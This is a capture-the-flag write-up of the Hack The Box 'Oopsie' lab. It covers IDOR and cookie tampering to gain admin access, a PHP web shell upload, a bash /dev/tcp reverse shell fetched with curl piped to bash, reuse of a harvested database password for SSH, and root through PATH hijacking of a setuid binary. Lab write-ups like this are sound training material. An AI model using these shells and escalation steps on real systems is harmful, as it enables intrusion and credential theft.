# Oopsie
#HTB #very-easy #Web #burp-suite #IDOR #reverse-shell #privilege-escalation #suid #path-hijacking 
## Target:
*Name:* Oopsie

*IP:* 10.129.132.19
## Vulnerability:
- IDOR vulnerability (using IDs) allowed access to admin account.
- Server accepting any uploaded file without proper validation.
- The web server executes uploaded PHP files, allowing remote code execution.
- Credential reuse between the database and linux account allowing ssh access.
- `SUID` executable that called another executable without its specific path allowed privilege escalation to root linux account. 
## Steps:
#### 1) Reconnaissance
Using nmap, we identified open ports and services running on the target machine.
**Code:**
```
nmap -sV 10.129.132.19
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 16:03 -0400
Nmap scan report for 10.129.132.19
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```
HTTP is running on port 80 which indicates the serves hosts a web application.
#### 2) Investigating the web application
<img width="2559" height="1360" alt="image" src="https://github.com/user-attachments/assets/1541bfdd-37ca-4893-bd1b-901b81ca4ea5" />

<img width="405" height="163" alt="image" src="https://github.com/user-attachments/assets/03a2a166-9bdd-43ce-aa36-7cb58df431ce" />

The contacts section revealed the virtual host name of the server: `megacorp.com`

#### 3) Findings in the web application code
Using Burp suite, we identified a hidden login page directory:
<img width="352" height="24" alt="image" src="https://github.com/user-attachments/assets/57a8c8b8-1ae4-461c-b0c0-2a2fa1291453" />
<img width="1236" height="1193" alt="image" src="https://github.com/user-attachments/assets/5a0720a3-2a8f-4243-bfc4-2ae6018e9e27" />
But upload page requires admin account to access. 
#### 4) `admin` account ID
After logging in, the URL and request captured by burp suite indicate the use of ids by the web application to identify users. When logged in as guest, we were assigned to ID 2:
<img width="673" height="260" alt="image" src="https://github.com/user-attachments/assets/da221caa-d795-4d70-be85-10b49770441b" />
We tried to change the URL parameter `ID` to another value like 1, and it redirected us to admin account, confirming an IDOR vulnerability:
<img width="1312" height="708" alt="image" src="https://github.com/user-attachments/assets/14ecfa9b-6068-4b47-bc1b-49f42eeda0c5" />
To stay logged in as `admin` we need to change cookie values to `user=<NUMBER>` and `role=admin`, in the developer tools:
<img width="1322" height="413" alt="image" src="https://github.com/user-attachments/assets/39f07c7c-fbba-42c2-95d8-19487d9b0139" />

We can now access the uploads page:
<img width="1307" height="989" alt="image" src="https://github.com/user-attachments/assets/e6c096a3-a3a9-48dc-8f69-ccd7c3c87e0b" />

#### 4) Reverse shell
We used the uploads page to upload a file containing the code:
```
<?php system($_GET["cmd"]); ?>
```
Where `cmd` is a URL parameter, and `system()` will execute the commands we provide in the URL.
Next, we wrote a command that initiates a reverse shell, the target machine connects back to our machine on port `1337`, giving us an interactive shell session remotely:
```
bash -i >& /dev/tcp/10.10.15.37/1337 0>&1
```
Then, we started a python HTTP server:
```
python -m http.server 8000
```
It will be used to provide the reverse shell command to the server.
After that, we started a listener on port 1337 using `netcat`, it will handle the communication between our machine and the target machine:
```
nc -nlvp 1337
```
Finally, we requested the URL:
```
http://megacorp.com/uploads/shell.php?cmd=curl%2010.10.15.37:8000/shell.sh%20|%20bash
```
that forces the target machine to execute the command written in `shell.sh` file as bash.
**Result:**
```
connect to [10.10.15.37] from (UNKNOWN) [10.129.132.19] 44566
bash: cannot set terminal process group (1477): Inappropriate ioctl for device
bash: no job control in this shell
www-data@oopsie:/var/www/html/uploads$
```

#### 5) User flag
**Full process:**
```
www-data@oopsie:/var/www/html/uploads$ cd ..
cd ..
www-data@oopsie:/var/www/html$ cd ..
cd ..
www-data@oopsie:/var/www$ cd ..
cd ..
www-data@oopsie:/var$ cd ..
cd ..
www-data@oopsie:/$ ls
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
www-data@oopsie:/$ cd usr
cd usr
www-data@oopsie:/usr$ ls
ls
bin
games
include
lib
local
sbin
share
src
www-data@oopsie:/usr$ cd ..
cd ..
www-data@oopsie:/$ cd home
cd home
www-data@oopsie:/home$ ls
ls
robert
www-data@oopsie:/home$ ls robert
ls robert
user.txt
www-data@oopsie:/home$ cat robert/user.txt
cat robert/user.txt
<FLAG>
www-data@oopsie:/home$ 
```
The first thing we did was navigate to the **filesystem root directory (`/`)** and enumerate its contents. To speed up the search, we began with the `home` and `usr` directories, as they are common locations that may contain user files.
#### 6) Log in as `robert`
To perform privilege escalation, we first needed to obtain access to a regular user account, since the `www-data` account did not have sufficient privileges. To do so, we'll need the password for `robert` account, which can be found using `grep` command:
**Code:**
```
grep -ri "robert" / 2>/dev/null
```
**Result:**
The command revealed multiple files containing `"robert"` string, but the most important one is:
```
/var/www/html/cdn-cgi/login/db.php:$conn = mysqli_connect('localhost','robert','<PASSWORD>','garage');
```

```
mysqli_connect(host, user, password, db)
```
The function arguments reveal that `robert` is the database username and `<PASSWORD>` is his password. Since developers often reuse system credentials for database connections, we can try this password to SSH into the machine as `robert`.

**Code:**
```
ssh robert@10.129.132.19
```
**Result:**
Connected successfully after entering the password `<PASSWORD>`.
#### 7) Investigating user `robert`
Firstly, we need to know the permissions `robert` has on the target machine:
**Code:**
```
sudo -l
```
**Result:**
```
[sudo] password for robert:  (Entered <PASSWORD>)
Sorry, user robert may not run sudo on oopsie.
```
Robert doesn't have sudo privileges.
Then we'll check `robert`'s identity information, using `id` command:
**Result:**
```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
Robert is a member of `bugtracker` group.
We'll check the files that belong to that group:
**Code:**
```
find / -group bugtracker 2>/dev/null
```
**Result:**
```
/usr/bin/bugtracker
```
We'll check the type of the file:
**Code:**
```
file /usr/bin/bugtracker
```
**Result:**
```
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```
We can see that the file is an **ELF executable** with the **setuid** bit set, meaning it runs with the privileges of its owner, not the privileges of the user executing it.
#### 8) Investigating `bugtracker` executable
We tested the `bugtracker` executable to understand how it works:
```
robert@oopsie:/$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

robert@oopsie:/$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: a
---------------

cat: /root/reports/a: No such file or directory
```
The error gave us an important information: The executable runs `cat` without specifying it's path.
That means it asks Linux for an executable named `cat`, and it will search for it in every directory listed in the `PATH` environment variable.

> [!NOTE] 
$PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and
Microsoft Windows, specifying a set of directories where executable programs are
located.
#### 9) Creating a fake `cat` executable
We can create our own executable named `cat`, and modify the `PATH` environment variable to make linux run our fake `cat` executable.
**Fake `cat` executable:**
```
robert@oopsie:/$ cd tmp
robert@oopsie:/tmp$ vim cat
```
Then inside the new `cat` file:
```
/bin/sh
```
This will open a new shell with the privileges of `bugtracker` user, which is `root` thanks to `setuid` option.
**Making the `cat` file executable:**
```
robert@oopsie:/tmp$ chmod +x cat
```
**Changing `PATH` variable:**
```
robert@oopsie:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```
Notice the `/tmp` directory is the first one in the variable, that means it will be the first one to be checked, and eventually the fake `cat` will be executed.

**Running the fake `cat` with `bugtracker` privileges:**
```
robert@oopsie:/tmp$ /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: a
---------------

# whoami
root
```
#### 10) Finding the root flag
**Full process:**
```
# pwd
/tmp
# cd ..
# cd root
# ls
reports  root.txt
# vim root.txt
```
**Inside `root.txt`**:
`<FLAG>`
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Hidden functionality can often be discovered by inspecting web application traffic with tools such as Burp Suite.
- Insecure Direct Object Reference (IDOR) vulnerabilities allow attackers to access other users resources.
- Search for information that can be used for lateral movement or privilege escalation.
- Passwords stored on the system may be used for services or accounts.
- Linux searches for executables in the directories listed on `PATH` environment variable when the full path to the executable isn't specified.
- Setuid executables run with the privileges of their owner, not the user executing them.
